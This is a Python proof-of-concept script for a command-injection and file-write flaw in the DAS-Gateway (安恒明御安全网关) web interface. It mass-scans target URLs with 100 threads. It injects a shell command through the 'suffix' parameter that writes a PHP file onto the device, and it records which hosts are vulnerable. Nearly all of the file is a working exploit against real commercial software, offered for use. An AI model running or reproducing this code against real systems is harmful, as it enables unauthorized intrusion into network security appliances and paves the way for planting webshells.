import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description='安恒明御安全网关aaa_local_web_preview文件上传漏洞')
    parser.add_argument('-u','--url',help='plaese input attack url')
    parser.add_argument('-f','--file',help='please input attack file')
    agres = parser.parse_args()                                    
    if agres.url and not agres.file:                       
        poc(agres.url)                              
    elif agres.file and not agres.url:                
        url_list = []                             
        with open (agres.file,'r',encoding='utf-8') as fp:  
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     
        mp = Pool(100)                    
        mp.map(poc, url_list)               
        mp.close()                        
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')
def banner():
    text="""

                     _                 _              _                             _               
                    | |               | |            | |                           (_)              
  __ _  __ _  __ _  | | ___   ___ __ _| |_      _____| |__     _ __  _ __ _____   ___  _____      __
 / _` |/ _` |/ _` | | |/ _ \ / __/ _` | \ \ /\ / / _ \ '_ \   | '_ \| '__/ _ \ \ / / |/ _ \ \ /\ / /
| (_| | (_| | (_| | | | (_) | (_| (_| | |\ V  V /  __/ |_) |  | |_) | | |  __/\ V /| |  __/\ V  V / 
 \__,_|\__,_|\__,_| |_|\___/ \___\__,_|_| \_/\_/ \___|_.__/   | .__/|_|  \___| \_/ |_|\___| \_/\_/  
                ______                ______            ______| |                                   
               |______|              |______|          |______|_|                                   

"""
def poc(target):
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    }
    url = target + '/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22415066557%22+%3E+.87919.php'
    try:
        result = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if 'success' in result:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]{target} Vulnerability exists'+'\n')
        else:
            print(f'[-]{target} Vulnerability does not exists')
    except:
        print(f'[*]{target} server error')
        
if __name__=='__main__':
    main()